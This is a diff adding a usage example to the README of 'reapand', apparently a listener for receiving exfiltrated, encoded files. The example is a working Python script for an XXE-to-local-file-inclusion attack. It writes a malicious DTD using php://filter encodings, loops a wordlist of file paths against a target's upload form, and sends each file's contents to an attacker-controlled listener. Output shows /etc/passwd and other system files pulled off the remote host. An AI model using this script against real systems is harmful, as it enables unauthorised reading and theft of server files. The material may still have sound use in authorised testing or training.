@@ -54,3 +54,70 @@ Command Line Usage Examples:
 reapand -e b64,zlib -p 20000 -d files/
 reapand -e b64,bzip2 -- 127.0.0.1
 ```
+
+### Example
+In order to use this tool we can build a tiny python script 
+during the exploitation of there an XXE2LFI:
+```python
+#!/usr/bin/env python3
+
+from time import sleep
+from requests import Session
+from sys import argv
+
+s = Session()
+
+LISTENER_IP = argv[1]
+LISTENER_PORT = argv[2]
+TARGET_URL = argv[3]
+WORDLIST = argv[4]
+
+ENCODINGS = [
+    "bzip2.compress",
+    "convert.base64-encode"
+]
+
+LFI_PAYLOAD = f"""
+<!ENTITY % file SYSTEM "php://filter/{"/".join(ENCODINGS)}/resource=[FILE]">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{LISTENER_IP}:{LISTENER_PORT}/[REAPAND_FMT_FILE]?%file;'>">
+%eval;
+%exfiltrate;
+"""
+
+with open(WORDLIST) as f:
+    for l in f:
+        with open("evil.dtd", "w") as writer:
+            writer.write(LFI_PAYLOAD.replace("[FILE]", l.strip("\n")).replace("[REAPAND_FMT_FILE]", l.replace("/", "_").strip("\n")))
+
+        s.post(TARGET_URL, files={'text': open("CV.docx", "rb")}, data={
+            "name": "reapand",
+            "email": "reapand",
+            "submit": "submit"
+        })
+        sleep(1)
+```
+
+Note, this script is just an example of what you could build in 
+conjunction with Reapand.
+![Reapand Handling Requests](images/reapand handling requests.png)
+```bash
+❯ tree -R files/
+files/
+└── etc
+    ├── crontab
+    ├── fstab
+    ├── hosts
+    ├── hosts.allow
+    ├── hosts.deny
+    ├── issue
+    ├── lsb-release
+    ├── mtab
+    ├── network
+    │   └── interfaces
+    ├── networks
+    └── passwd
+
+2 directories, 11 files
+```
+
+Then we get all the content of the readable files on the remote filesystem !
